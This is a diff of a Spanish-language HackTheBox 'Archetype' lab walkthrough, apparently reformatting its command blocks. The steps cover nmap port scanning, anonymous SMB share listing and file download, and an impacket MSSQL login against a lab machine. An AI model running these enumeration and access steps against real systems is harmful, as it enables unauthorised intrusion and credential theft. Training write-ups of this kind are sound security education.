@@ -9,7 +9,7 @@ tags: HTB, Empezando, Hacking, Starting
 
 Comprobamos que la maquina este activa con una traza ICMP, usamos la herramienta PING.
 ```bash
- "# ping -c 10 10.10.10.27"                                       
+ "# ping -c 10 10.10.10.27    "                                       
 PING 10.10.10.27 (10.10.10.27) 56(84) bytes of data.
 64 bytes from 10.10.10.27: icmp_seq=1 ttl=127 time=39.4 ms
 64 bytes from 10.10.10.27: icmp_seq=2 ttl=127 time=39.5 ms
@@ -25,18 +25,18 @@ La maquina esta activa y por el ttl identificamos que puede es WINDOWS
 Procedemos a enumerar todos los puertos abiertos en un escaneo usando los siguiente parametros:
 
 ```bash
- "nmap -p- --open -T5 -v -n -Pn [IP VICTIMA]" 
+ "nmap -p- --open -T5 -v -n -Pn 10.10.10.27   " 
 ```  
  Si en la maquina victima el escaneo con Nmap va lento..
  Usamos el siguiente escaneo:
  
 ```bash
- "nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn "[IP VICTIMA]" -oG allports"
+ "nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn 10.10.10.27 -oG allports    "
 ```
 Con la funcion de extractPorts: filtramos por los puertos abiertos pasandole el archivo de salida del primer escaneo con Nmap
 
 ```bash
-"# extractPorts allports"
+"# extractPorts allports   "
 
 [*] Extracting information .......
 
@@ -57,8 +57,8 @@ Output:
 PORT      STATE SERVICE      VERSION
 135/tcp   open  msrpc        Microsoft Windows RPC
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-"445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds"
-"1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM"
+445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
 | ms-sql-ntlm-info: 
 |   Target_Name: ARCHETYPE
 |   NetBIOS_Domain_Name: ARCHETYPE
@@ -70,10 +70,10 @@ PORT      STATE SERVICE      VERSION
 | Not valid before: 2021-03-16T16:48:45
 |_Not valid after:  2051-03-16T16:48:45
 |_ssl-date: 2021-03-16T17:55:06+00:00; +17m25s from scanner time.
-"5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)"
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
-"47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)"
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 49664/tcp open  msrpc        Microsoft Windows RPC
@@ -118,7 +118,7 @@ Encontramos iformacion util para proseguir con las siguiente herramienta
 Utilizamos la siguiente herramienta para ver si tenemos acceso al servicio samba sin proporcionar contraseña (-N) y ver si hay algun recurso disponible, descargarlo, subir algun archivo etc.
 smbclient
 ```bash
-"smbclient -N -L //10.10.10.27/"
+"smbclient -N -L //10.10.10.27/    "
    
    Sharename       Type      Comment
         ---------       ----      -------
@@ -131,7 +131,7 @@ SMB1 disabled -- no workgroup available
 Idientificamos un directorio llamado BACKUPS al que podemos acceder sin contraseña:
 
 ```bash
-"smbclient -N  //10.10.10.27/backups"
+"smbclient -N  //10.10.10.27/backups    "
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                   D        0  Mon Jan 20 13:20:57 2020
@@ -146,12 +146,12 @@ Probamos a descargar el archivo encontrado.
 Lo conseguimos descargar correctamente.
 
 ```bash
-"smb: \> get prod.dtsConfig"
+"smb: \> get prod.dtsConfig    "
 getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0,7 KiloBytes/sec) (average 0,7 KiloBytes/sec)
 ```
 Le cambiamos de nombre al archivo descargado:
 ```bash
-mv prod.dtsConfig datos 
+"mv prod.dtsConfig datos    " 
 ```
 Leemos el archivo encontrado
 ```bash
@@ -167,8 +167,7 @@ Leemos el archivo encontrado
 mssqlclient.py
 
 ```bash
-"──(pro㉿pro)-[/opt]
-└─$ /usr/bin/python3 /opt/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth"                                                          2 ⨯
+"─$ /usr/bin/python3 /opt/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth"                                                          2 ⨯
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 Password:
